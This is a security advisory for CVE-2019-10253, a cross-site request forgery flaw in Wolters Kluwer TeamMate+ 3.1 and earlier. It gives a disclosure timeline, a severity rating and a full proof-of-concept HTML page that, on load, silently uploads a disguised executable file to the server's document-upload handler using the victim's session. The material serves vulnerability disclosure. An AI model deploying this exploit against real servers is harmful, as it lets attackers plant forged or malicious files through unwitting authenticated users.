@@ -1,0 +1,233 @@
+Hello,
+
+Please find the below vulnerability details,
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# Exploit Title: Wolters Kluwer TeamMate+ – Cross-Site Request Forgery
+(CSRF) vulnerability
+# Date: 02/09/2019
+# Exploit Author: Bhadresh Patel
+# Version: <= TeamMate Version 3.1 (January 2019) (Internal Version:21.0.0.0)
+# CVE : CVE-2019-10253
+
+This is an article with PoC exploit code for for Wolters Kluwer TeamMate+ –
+Cross-Site Request Forgery (CSRF) vulnerability
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+
+Title:
+====
+
+Wolters Kluwer TeamMate+ – Cross-Site Request Forgery (CSRF) vulnerability
+
+
+CVE:
+====
+
+CVE-2019-10253
+
+
+Date:
+====
+
+02/09/2019 (dd/mm/yyyy)
+
+
+Vendor:
+======
+
+Wolters Kluwer is a global leader in professional information, software
+solutions, and services for the health, tax & accounting, finance, risk &
+compliance, and legal sectors. We help our customers make critical
+decisions every day by providing expert solutions that combine deep domain
+knowledge with specialized technology and services.
+
+Vendor link: http://www.teammatesolutions.com/about-us.aspx
+
+
+Vulnerable Product:
+==============
+
+TeamMate+
+
+TeamMate Global Audit Solutions, part of the Tax and Accounting Division of
+Wolters Kluwer, helps professionals in all industries at organizations
+around the world manage audit and compliance risks and business issues by
+providing targeted, configurable, and efficient software solutions.
+Solutions include TeamMate+ Audit, TeamMate+ Controls, and TeamMate
+Analytics. Together, this ecosystem of solutions provides organizations
+with the combined assurance they need to manage all aspects of risk
+identification and assessment, electronic working paper creation and
+management, controls framework management, and data analysis.
+
+
+Abstract:
+=======
+
+Cross-Site Request Forgery (CSRF) vulnerability in TeamMate+ could allow an
+attacker to upload malicious/forged files on TeamMate server or replace
+existing uploaded files with malicious/forged files by enticing
+authenticated user to visit attacker page.
+
+
+
+Report-Timeline:
+================
+
+19/03/2019: Vendor notified
+19/03/2019: Vendor responded requesting further information
+20/03/2019: Further technical information with PoC was shared with vendor
+01/07/2019: Vendor fixed the issue in version 3.2
+
+
+Affected Software Version:
+==========================
+
+<= TeamMate January 2019 (Version 3.1) (Internal Version: 21.0.0.0)
+
+
+Exploitation-Technique:
+=======================
+
+Remote
+
+
+Severity Rating (CVSS):
+=======================
+
+4.3 (Medium) (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N)
+
+CVE ID:
+=======
+
+CVE-2019-10253
+
+
+Details:
+=======
+
+A Cross-Site Request Forgery (CSRF) vulnerability is discovered in
+TeamMate+ which allows a remote attacker to modify application data (upload
+malicious/forged files on TeamMate server or replace existing uploaded
+files with malicious/forged files) without victim's knowledge by enticing
+authenticated user to visit attacker page/URL.
+
+The specific flaw exists within the handling of request to
+“DomainObjectDocumentUpload.ashx” application. An application failed to
+validate CSRF token before handling the POST request.
+
+Vulnerable module/page/application:
+/TeamMate/Upload/DomainObjectDocumentUpload.ashx
+
+PoC Exploit code:
+----------------------------------------------------------------------------
+
+<html>
+
+   <body onload="submitRequest()">
+
+    <script>
+
+      function submitRequest()
+
+      {
+
+        var xhr = new XMLHttpRequest();
+
+        xhr.open("POST",
+"https://<ServerIP>/TeamMate/Upload/DomainObjectDocumentUpload.ashx",
+true);
+
+        xhr.setRequestHeader("Accept", "text/html, */*; q=0.01");
+
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9,ar;q=0.8");
+
+        xhr.setRequestHeader("Content-Type", "multipart/form-data;
+boundary=----WebKitFormBoundaryNA930lURoQYsoTOn");
+
+        xhr.withCredentials = true;
+
+        var body = "------WebKitFormBoundaryNA930lURoQYsoTOn\r\n" +
+
+          "Content-Disposition: form-data; name=\"fileObjectId\"\r\n" +
+
+          "\r\n" +
+
+          "0\r\n" +
+
+          "------WebKitFormBoundaryNA930lURoQYsoTOn\r\n" +
+
+          "Content-Disposition: form-data; name=\"parentId\"\r\n" +
+
+          "\r\n" +
+
+          "1373\r\n" +
+
+          "------WebKitFormBoundaryNA930lURoQYsoTOn\r\n" +
+
+          "Content-Disposition: form-data; name=\"AssessmentId\"\r\n" +
+
+          "\r\n" +
+
+          "34\r\n" +
+
+          "------WebKitFormBoundaryNA930lURoQYsoTOn\r\n" +
+
+          "Content-Disposition: form-data; name=\"ProjectId\"\r\n" +
+
+          "\r\n" +
+
+          "1106\r\n" +
+
+          "------WebKitFormBoundaryNA930lURoQYsoTOn\r\n" +
+
+          "Content-Disposition: form-data; name=\"ParentNodeType\"\r\n" +
+
+          "\r\n" +
+
+          "50\r\n" +
+
+          "------WebKitFormBoundaryNA930lURoQYsoTOn\r\n" +
+
+          "Content-Disposition: form-data;
+name=\"DocumentParentObjectType\"\r\n" +
+
+          "\r\n" +
+
+          "90\r\n" +
+
+          "------WebKitFormBoundaryNA930lURoQYsoTOn\r\n" +
+
+          "Content-Disposition: form-data; name=\"files[]\";
+filename=\"Report.txt\"\r\n" +
+
+          "Content-Type: application/x-msdownload\r\n" +
+
+          "\r\n" +
+
+          "MZP\r\n" +
+
+          "------WebKitFormBoundaryNA930lURoQYsoTOn--\r\n";
+
+        var aBody = new Uint8Array(body.length);
+
+        for (var i = 0; i < aBody.length; i++)
+
+          aBody[i] = body.charCodeAt(i);
+
+        xhr.send(new Blob([aBody]));
+
+      }
+
+    </script>
+  </body>
+</html>
+
+----------------------------------------------------------------------------
+
+Credits:
+=======
+
+Bhadresh Patel
